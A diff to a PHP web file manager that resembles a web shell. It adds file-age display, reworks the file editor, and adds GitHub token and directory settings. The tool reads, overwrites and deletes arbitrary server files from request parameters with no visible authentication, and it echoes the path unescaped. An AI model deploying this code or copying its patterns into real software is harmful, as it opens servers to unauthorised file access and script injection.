@@ -266,7 +266,31 @@ function magicboom($text){
 	}
 	return stripslashes($text);
 }
-
+function timeAgo($timestamp) {
+    $time_ago = time() - $timestamp;
+    
+    if ($time_ago < 60) {
+        return $time_ago . 's';
+    } elseif ($time_ago < 3600) {
+        $minutes = floor($time_ago / 60);
+        return $minutes . 'm';
+    } elseif ($time_ago < 86400) {
+        $hours = floor($time_ago / 3600);
+        return $hours . 'h';
+    } elseif ($time_ago < 604800) {
+        $days = floor($time_ago / 86400);
+        return $days . 'd';
+    } elseif ($time_ago < 2592000) {
+        $weeks = floor($time_ago / 604800);
+        return $weeks . 'w';
+    } elseif ($time_ago < 31536000) {
+        $months = floor($time_ago / 2592000);
+        return $months . 'mo';
+    } else {
+        $years = floor($time_ago / 31536000);
+        return $years . 'y';
+    }
+}
 function showdir($pwd,$prompt){
 	global $user, $win, $posix;
 	$fname = array();
@@ -313,7 +337,7 @@ function showdir($pwd,$prompt){
 
 $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".$parent."'\">
     <td class=\"file-name\"><span class=\"folder-icon\"><img width=24px src=f7p-assets/up.png></span> ..</td>
-    <td>go up one dir</td>
+    <td>go up one dir</td><td></td>
     <td style=\"text-align:right;\">
 <a href=\"?y=$pwd&amp;x=upload\" data-no-ajax=\"true\"><img width=24px src=f7p-assets/upload.png></a>
         
@@ -326,13 +350,15 @@ $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.lo
 	foreach($dname as $folder){
     $full_folder = $pwd.$folder;
     $safe_id = 'd_' . md5($folder);
-    
+   $folder_time = date("Y-m-d H:i:s", filemtime($full_folder));
+$folder_ago = timeAgo(filemtime($full_folder));
+
     $buff .= "<tr style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".urlencode($pwd.$folder.DIRECTORY_SEPARATOR)."'\">
         <td class=\"file-name\">
             <span class=\"folder-icon\">
                 <img width=20px src=f7p-assets/dir.png>
             </span> 
-            <span class=\"file-name-text\" id=\"{$safe_id}_link\">".htmlspecialchars($folder)."</span>  <!-- ← Tambahkan class -->
+            <span class=\"file-name-text\" id=\"{$safe_id}_link\">".htmlspecialchars($folder)."</span>  
             <form action=\"?y=".urlencode($pwd)."\" method=\"post\" id=\"{$safe_id}_form\" class=\"rename-form\" style=\"display:none;\">
                 <input type=\"hidden\" name=\"oldname\" value=\"".htmlspecialchars($folder)."\" />
                 <input type=\"hidden\" name=\"current_dir\" value=\"".htmlspecialchars($pwd)."\" />
@@ -342,7 +368,7 @@ $buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.lo
                 <input class=\"inputzbut\" type=\"button\" value=\"✕\" onclick=\"event.stopPropagation();toggleRename('{$safe_id}');\" />
             </form>
         </td>
-        <td></td>
+        <td></td>    <td style=\"font-size:12px;color:#888;\">".$folder_ago."</td>
         <td style=\"white-space:nowrap;text-align:right;\">
             <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();showRenameAlert('".addslashes($folder)."', '".addslashes($full_folder)."', '".addslashes($pwd)."', 'folder');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
             <a href=\"?y=".urlencode($pwd)."&amp;fdelete=".urlencode($pwd.$folder)."\" onclick=\"event.stopPropagation();return confirmDelete('".addslashes($folder)."', 'folder');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=f7p-assets/rcb.png></a>
@@ -359,7 +385,9 @@ foreach($fname as $file){
     
     $edit_link = "edit=" . urlencode($full);
     $view_link = $is_image ? "img=" . urlencode($file) : "view=" . urlencode($full);
-    
+   $file_time = date("Y-m-d H:i:s", filemtime($full));
+$file_ago = timeAgo(filemtime($full));
+
     $buff .= "<tr>
         <td class=\"file-name\">
             <span class=\"file-icon\">
@@ -374,7 +402,7 @@ foreach($fname as $file){
                 <input class=\"inputzbut\" type=\"button\" value=\"✕\" onclick=\"event.stopPropagation();toggleRename('".clearspace($file)."');\" />
             </form>
         </td>
-        <td>".$size."</td>
+        <td>".$size."</td><td style=\"font-size:12px;color:#666;\">".$file_ago."</td>
         <td style=\"white-space:nowrap;text-align:right;\">
             <a href=\"?y=$pwd&amp;$view_link\" data-no-ajax=\"true\" title=\"View\"><img width=20px src=f7p-assets/view.png></a>
             <a href=\"javascript:void(0);\" onclick=\"showRenameAlert('".addslashes($file)."', '".addslashes($full)."', '".addslashes($pwd)."');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
@@ -904,90 +932,92 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
             echo showdir($pwd, $prompt);
         }
     }
-    elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
-        $file = isset($_GET['edit']) ? $_GET['edit'] : '';
+ 
+elseif(isset($_GET['edit']) && ($_GET['edit'] != "")){
+    $file = isset($_GET['edit']) ? $_GET['edit'] : '';
+    
+    if(isset($_POST['save'])){
+        $file = $_POST['saveas'];
         
-        if(isset($_POST['save'])){
-    $file = $_POST['saveas'];
-    
-    $content = isset($_POST['content']) ? $_POST['content'] : '';
-    if(empty($content) && isset($_POST['content_plain'])) {
-        $content = $_POST['content_plain'];
-    }
-    
-    $timezones = [
-        'Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura',
-        'Asia/Singapore', 'Asia/Bangkok', 'Asia/Ho_Chi_Minh',
-        'Asia/Kuala_Lumpur', 'Asia/Manila', 'Asia/Tokyo',
-        'America/New_York', 'America/Los_Angeles', 'Europe/London',
-        'Europe/Paris', 'Australia/Sydney'
-    ];
-    
-    $user_timezone = isset($_POST['user_timezone']) ? $_POST['user_timezone'] : 'Asia/Jakarta';
-    
-    if (!in_array($user_timezone, $timezones)) {
-        $user_timezone = 'Asia/Jakarta';
-    }
-    
-    @date_default_timezone_set($user_timezone);
-    
-    $msg = "";
-    
-    if($filez = @fopen($file,"w")){
-        $time = date("h:i:s a", time());
-        if(@fwrite($filez, $content)) {
-            $time = preg_replace('/(\d{2}:\d{2}:\d{2}\s[ap]m)/', '<strong>$1</strong>', $time);
-            $msg = "Saved at " . $time;
-        } else {
-            $msg = "Failed to write";
+        $content = isset($_POST['content']) ? $_POST['content'] : '';
+        if(empty($content) && isset($_POST['content_plain'])) {
+            $content = $_POST['content_plain'];
         }
-        @fclose($filez);
-    } else {
-        $msg = "Permission denied";
-    }
-}
-        $content = "";
-        if(file_exists($file) && is_file($file)){
-            if($filez = @fopen($file,"r")){
-                while(!feof($filez)){
-                    $content .= fgets($filez);
-                }
-                @fclose($filez);
+        
+        $timezones = [
+            'Asia/Jakarta', 'Asia/Makassar', 'Asia/Jayapura',
+            'Asia/Singapore', 'Asia/Bangkok', 'Asia/Ho_Chi_Minh',
+            'Asia/Kuala_Lumpur', 'Asia/Manila', 'Asia/Tokyo',
+            'America/New_York', 'America/Los_Angeles', 'Europe/London',
+            'Europe/Paris', 'Australia/Sydney'
+        ];
+        
+        $user_timezone = isset($_POST['user_timezone']) ? $_POST['user_timezone'] : 'Asia/Jakarta';
+        
+        if (!in_array($user_timezone, $timezones)) {
+            $user_timezone = 'Asia/Jakarta';
+        }
+        
+        @date_default_timezone_set($user_timezone);
+        
+        $msg = "";
+        
+        if($filez = @fopen($file,"w")){
+            $time = date("h:i:s a", time());
+            if(@fwrite($filez, $content)) {
+                $time = preg_replace('/(\d{2}:\d{2}:\d{2}\s[ap]m)/', '<strong>$1</strong>', $time);
+                $msg = "Saved at " . $time;
+            } else {
+                $msg = "Failed to write";
             }
+            @fclose($filez);
+        } else {
+            $msg = "Permission denied";
         }
-        
-        $display_content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
-        $content_base64 = base64_encode($content);
-        ?>
-        <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo urlencode($file); ?>" method="post" id="editForm">
-    <input type="hidden" name="saveas" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>">
-    <textarea class="output" name="content_plain" id="editorContent" style="height:400px;"><?php echo $display_content; ?></textarea>
-   <?php
+    }
+    
+    $content = "";
+    if(file_exists($file) && is_file($file)){
+        if($filez = @fopen($file,"r")){
+            while(!feof($filez)){
+                $content .= fgets($filez);
+            }
+            @fclose($filez);
+        }
+    }
+    
+    $display_content = htmlspecialchars($content, ENT_QUOTES, 'UTF-8');
+    $content_base64 = base64_encode($content);
+    ?>
+    <form action="?y=<?php echo $pwd; ?>&amp;edit=<?php echo urlencode($file); ?>" method="post" id="editForm">
+        <input type="hidden" name="saveas" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>">
+        <textarea class="output" name="content_plain" id="editorContent" style="height:400px;"><?php echo $display_content; ?></textarea>
+        <?php
         if(isset($msg) && $msg != "") {
             echo "<div style='text-align:right;font-size:12px;'>{$msg}</div>";
         }
         ?> 
-    <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
-        <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/previous.png></a>
-        <input class="inputz" id="saveas_input" type="text" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>" style="flex:2;min-width:120px;" readonly />
-        <input class="inputzbut" type="submit" value="Save" name="save" style="flex:1;min-width:70px;" />
-    </div>
-    
-            <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
-                <span style="font-size:13px;color:#666;white-space:nowrap;flex-shrink:0;"><img width=24px src=f7p-assets/github.png></span>
-                <input class="inputz" id="github_full_path" type="text" style="flex:2;min-width:120px;font-size:13px;font-family:monospace;" 
-                       value="Loading..." readonly />
-                <input class="inputzbut" type="button" value="Push to Git" id="pushToGitBtn" onclick="pushToGitHub()" style="flex:1;min-width:70px;background:#2b3137;opacity:0.5;cursor:not-allowed;" disabled />
-            </div>
-            
-            <div class="cmd-row mt-2" style="display:flex;gap:8px;flex-wrap:wrap;">
-    <input class="inputzbut" type="button" value="Copy" id="copyContentBtn" style="flex:1;background:#006600;" />
-    <input class="inputzbut" type="button" value="Paste + Save" id="pasteSaveBtn" style="flex:1;background:#ff0000;" />
-    <input class="inputzbut" type="button" value="Remove Comments" id="removeCommentsBtn" style="flex:1;background:#d29922;" />
-</div>
-        </form>
+        <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
+            <a href="?y=<?php echo $pwd; ?>" data-no-ajax="true"><img width=24px src=f7p-assets/previous.png></a>
+            <input class="inputz" id="saveas_input" type="text" value="<?php echo htmlspecialchars($file, ENT_QUOTES, 'UTF-8'); ?>" style="flex:2;min-width:120px;" readonly />
+            <input class="inputzbut" type="submit" value="Save" name="save" style="flex:1;min-width:70px;" />
+        </div>
         
-        <script src="f7p-assets/_script_editpage.js"></script>
+        <div class="cmd-row mt-2" style="display:flex;gap:8px;align-items:center;width:100%;flex-wrap:wrap;">
+            <span style="font-size:13px;color:#666;white-space:nowrap;flex-shrink:0;"><img width=24px src=f7p-assets/github.png></span>
+            <input class="inputz" id="github_full_path" type="text" style="flex:2;min-width:120px;font-size:13px;font-family:monospace;" 
+                   value="Loading..." readonly />
+            <input class="inputzbut" type="button" value="Push to Git" id="pushToGitBtn" onclick="pushToGitHub()" style="flex:1;min-width:70px;background:#2b3137;opacity:0.5;cursor:not-allowed;" disabled />
+        </div>
+        
+        <div class="cmd-row mt-2" style="display:flex;gap:8px;flex-wrap:wrap;">
+            <input class="inputzbut" type="button" value="Copy" id="copyContentBtn" style="flex:1;background:#006600;" />
+            <input class="inputzbut" type="button" value="Paste + Save" id="pasteSaveBtn" style="flex:1;background:#ff0000;" />
+            <input class="inputzbut" type="button" value="Remove Comments" id="removeCommentsBtn" style="flex:1;background:#d29922;" />
+        </div>
+    </form>
+    
+    <script src="f7p-assets/_script_editpage.js"></script>
         <?php
     } 
     elseif(isset($_GET['x']) && ($_GET['x'] == 'upload')){
@@ -1153,73 +1183,172 @@ jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
             </div>
         </form>
     <?php
-    }
-    elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
-        if(isset($_POST['save_github_token'])){
-            $token = trim($_POST['github_token']);
-            $repo = trim($_POST['github_repo']);
-            $branch = trim($_POST['github_branch']);
-            $server_path = trim($_POST['github_server_path']);
-            $github_path = trim($_POST['github_path']);
-            ?>
-            <script>
-            localStorage.setItem('f7p_gh_token_9x7k2m', '<?php echo addslashes($token); ?>');
-            localStorage.setItem('f7p_gh_repo_9x7k2m', '<?php echo addslashes($repo); ?>');
-            localStorage.setItem('f7p_gh_branch_9x7k2m', '<?php echo addslashes($branch); ?>');
-            localStorage.setItem('f7p_gh_server_path_9x7k2m', '<?php echo addslashes($server_path); ?>');
-            localStorage.setItem('f7p_gh_path_9x7k2m', '<?php echo addslashes($github_path); ?>');
-            window.location.href = '?y=<?php echo $pwd; ?>&x=github&saved=1';
-            </script>
-            <?php
-            exit;
-        }
+}
+elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
+   
+    $suggested_server_path = dirname($_SERVER['SCRIPT_FILENAME']) . DIRECTORY_SEPARATOR;
+    
+   
+    if(isset($_POST['save_github_token'])){
+        $token = trim($_POST['github_token']);
+        $repo = trim($_POST['github_repo']);
+        $branch = trim($_POST['github_branch']);
+        $server_path = trim($_POST['github_server_path']);
+        $github_path = trim($_POST['github_path']);
+        $dir_mode = isset($_POST['dir_mode']) ? $_POST['dir_mode'] : 'single';
+        $frontend_path = trim($_POST['frontend_path']);
+        $backend_path = trim($_POST['backend_path']);
         ?>
-        <div style="max-width:600px;margin:0 auto;">
-            <h2 style="color:#0066cc;margin-bottom:16px;">GitHub API Settings <small>(saved on localStorage)</small></h2>
-            <?php if(isset($_GET['saved'])): ?>
-            <div style="background:#e6f7e6;padding:12px;border-radius:6px;margin-bottom:16px;color:#006600;">Settings saved successfully!</div>
-            <?php endif; ?>
+        <script>
+        localStorage.setItem('f7p_gh_token_9x7k2m', '<?php echo addslashes($token); ?>');
+        localStorage.setItem('f7p_gh_repo_9x7k2m', '<?php echo addslashes($repo); ?>');
+        localStorage.setItem('f7p_gh_branch_9x7k2m', '<?php echo addslashes($branch); ?>');
+        localStorage.setItem('f7p_gh_server_path_9x7k2m', '<?php echo addslashes($server_path); ?>');
+        localStorage.setItem('f7p_gh_path_9x7k2m', '<?php echo addslashes($github_path); ?>');
+        localStorage.setItem('f7p_dir_mode_9x7k2m', '<?php echo addslashes($dir_mode); ?>');
+        localStorage.setItem('f7p_frontend_path_9x7k2m', '<?php echo addslashes($frontend_path); ?>');
+        localStorage.setItem('f7p_backend_path_9x7k2m', '<?php echo addslashes($backend_path); ?>');
+        window.location.href = '?y=<?php echo $pwd; ?>&x=github&saved=1';
+        </script>
+        <?php
+        exit;
+    }
+    ?>
+    <div style="max-width:600px;margin:0 auto;">
+        <h2 style="color:#0066cc;margin-bottom:16px;">GitHub API Settings <small>(saved on localStorage)</small></h2>
+        <?php if(isset($_GET['saved'])): ?>
+        <div style="background:#e6f7e6;padding:12px;border-radius:6px;margin-bottom:16px;color:#006600;">Settings saved successfully!</div>
+        <?php endif; ?>
+        
+        <form method="post" action="?y=<?php echo $pwd; ?>&x=github" id="githubSettingsForm">
+            <table class="tabnet">
+                <tr>
+                    <td style="width:120px;">Token</td>
+                    <td><input class="inputz w-full" type="password" name="github_token" placeholder="ghp_xxxxxxxxxxxx" id="github_token" /></td>
+                </tr>
+                <tr>
+                    <td>Repository</td>
+                    <td><input class="inputz w-full" type="text" name="github_repo" placeholder="username/repo" id="github_repo" /></td>
+                </tr>
+                <tr>
+                    <td>Branch</td>
+                    <td><input class="inputz w-full" type="text" name="github_branch" placeholder="main" id="github_branch" value="main" /></td>
+                </tr>
+                <tr>
+                    <td style="vertical-align:top;padding-top:12px;">Dir Mode</td>
+                    <td>
+                        <div style="display:flex;gap:20px;align-items:center;flex-wrap:wrap;">
+                            <label style="cursor:pointer;display:flex;align-items:center;gap:6px;">
+                                <input type="radio" name="dir_mode" value="single" checked onchange="toggleMultiDir(false)" />
+                                Single Dir
+                            </label>
+                            <label style="cursor:pointer;display:flex;align-items:center;gap:6px;">
+                                <input type="radio" name="dir_mode" value="multi" onchange="toggleMultiDir(true)" />
+                                Multi Dir
+                            </label>
+                        </div>
+                        <div style="font-size:12px;color:#666;margin-top:4px;">
+                            All files in 1 directory or separate directory 
+                        </div>
+                    </td>
+                </tr>
+                <tr id="singleDirRow">
+                    <td style="vertical-align:top;padding-top:12px;">GitHub Dir</td>
+                    <td>
+                        <input class="inputz w-full" type="text" name="github_path" placeholder="buku" id="github_path" />
+                        <div style="font-size:12px;color:#666;margin-top:4px;">
+                            Directory in Your Repository (for Single Dir mode)
+                        </div>
+                    </td>
+                </tr>
+                <tr id="multiDirRow" style="display:none;">
+                    <td style="vertical-align:top;padding-top:12px;">Multi Dir</td>
+                    <td>
+                        <div style="display:flex;flex-direction:column;gap:8px;">
+                            <div>
+                                <label style="font-size:13px;font-weight:bold;color:#0066cc;">Your Frontend directory on GitHub</label>
+                                <input class="inputz w-full" type="text" name="frontend_path" placeholder="frontend" id="frontend_path" />
+                                <div style="font-size:11px;color:#888;margin-top:2px;">
+                                    Auto detect on Edit Page: HTML, CSS, JS, Images, etc.
+                                </div>
+                            </div>
+                            <div>
+                                <label style="font-size:13px;font-weight:bold;color:#cc3333;">Your Backend directory on GitHub</label>
+                                <input class="inputz w-full" type="text" name="backend_path" placeholder="backend" id="backend_path" />
+                                <div style="font-size:11px;color:#888;margin-top:2px;">
+                                    Auto detect on Edit Page: PHP, .htaccess, .env, config, etc.
+                                </div>
+                            </div>
+                        </div>
+                    </td>
+                </tr>
+                <tr>
+                    <td style="vertical-align:top;padding-top:12px;">Server Path</td>
+                    <td>
+                        <input class="inputz w-full" type="text" name="github_server_path" 
+                               placeholder="<?php echo htmlspecialchars($suggested_server_path); ?>" 
+                               id="github_server_path" 
+                               value="<?php echo htmlspecialchars($suggested_server_path); ?>" />
+                        <div style="font-size:12px;color:#666;margin-top:4px;">
+                            Full Directory link in this server<br>(suggested: <?php echo htmlspecialchars($suggested_server_path); ?>)
+                        </div>
+                    </td>
+                </tr>
+                <tr>
+                    <td colspan="2" style="text-align:center;">
+                        <input class="inputzbut" type="submit" name="save_github_token" value="Save Settings" style="width:100%;" />
+                    </td>
+                </tr>
+            </table>
+        </form>
+        
+        <script>
+       
+        function toggleMultiDir(isMulti) {
+            var singleRow = document.getElementById('singleDirRow');
+            var multiRow = document.getElementById('multiDirRow');
             
-            <form method="post" action="?y=<?php echo $pwd; ?>&x=github">
-                <table class="tabnet">
-                    <tr>
-                        <td style="width:120px;">Token</td>
-                        <td><input class="inputz w-full" type="password" name="github_token" placeholder="ghp_xxxxxxxxxxxx" id="github_token" /></td>
-                    </tr>
-                    <tr>
-                        <td>Repository</td>
-                        <td><input class="inputz w-full" type="text" name="github_repo" placeholder="username/repo" id="github_repo" /></td>
-                    </tr>
-                    <tr>
-                        <td>Branch</td>
-                        <td><input class="inputz w-full" type="text" name="github_branch" placeholder="main" id="github_branch" value="main" /></td>
-                    </tr>
-                    <tr>
-                        <td style="vertical-align:top;padding-top:12px;">GitHub Dir</td>
-                        <td>
-                            <input class="inputz w-full" type="text" name="github_path" placeholder="buku" id="github_path" />
-                            <div style="font-size:12px;color:#666;margin-top:4px;">
-                                Directory in Your Repository
-                            </div>
-                        </td>
-                    </tr>
-                    <tr>
-                        <td style="vertical-align:top;padding-top:12px;">Server Path</td>
-                        <td>
-                            <input class="inputz w-full" type="text" name="github_server_path" placeholder="/home/vol13_7/.../htdocs/p/" id="github_server_path" />
-                            <div style="font-size:12px;color:#666;margin-top:4px;">
-                                Full Directory link in this server
-                            </div>
-                        </td>
-                    </tr>
-                    <tr>
-                        <td colspan="2" style="text-align:center;">
-                            <input class="inputzbut" type="submit" name="save_github_token" value="Save Settings" style="width:100%;" />
-                        </td>
-                    </tr>
-                </table>
-            </form>
-<script src="f7p-assets/_github.js"></script>
+            if (singleRow && multiRow) {
+                if (isMulti) {
+                    singleRow.style.display = 'none';
+                    multiRow.style.display = 'table-row';
+                } else {
+                    singleRow.style.display = 'table-row';
+                    multiRow.style.display = 'none';
+                }
+            }
+        }
+        
+       
+        document.addEventListener('DOMContentLoaded', function() {
+            var token = localStorage.getItem('f7p_gh_token_9x7k2m');
+            var repo = localStorage.getItem('f7p_gh_repo_9x7k2m');
+            var branch = localStorage.getItem('f7p_gh_branch_9x7k2m');
+            var serverPath = localStorage.getItem('f7p_gh_server_path_9x7k2m');
+            var githubPath = localStorage.getItem('f7p_gh_path_9x7k2m');
+            var dirMode = localStorage.getItem('f7p_dir_mode_9x7k2m');
+            var frontendPath = localStorage.getItem('f7p_frontend_path_9x7k2m');
+            var backendPath = localStorage.getItem('f7p_backend_path_9x7k2m');
+            
+            if (token) document.getElementById('github_token').value = token;
+            if (repo) document.getElementById('github_repo').value = repo;
+            if (branch) document.getElementById('github_branch').value = branch;
+            if (serverPath) document.getElementById('github_server_path').value = serverPath;
+            if (githubPath) document.getElementById('github_path').value = githubPath;
+            if (frontendPath) document.getElementById('frontend_path').value = frontendPath;
+            if (backendPath) document.getElementById('backend_path').value = backendPath;
+            
+            if (dirMode === 'multi') {
+                document.querySelector('input[name="dir_mode"][value="multi"]').checked = true;
+                toggleMultiDir(true);
+            } else {
+                document.querySelector('input[name="dir_mode"][value="single"]').checked = true;
+                toggleMultiDir(false);
+            }
+        });
+        </script>
+        
+        <script src="f7p-assets/_github.js"></script>
         <?php
     }
     else {
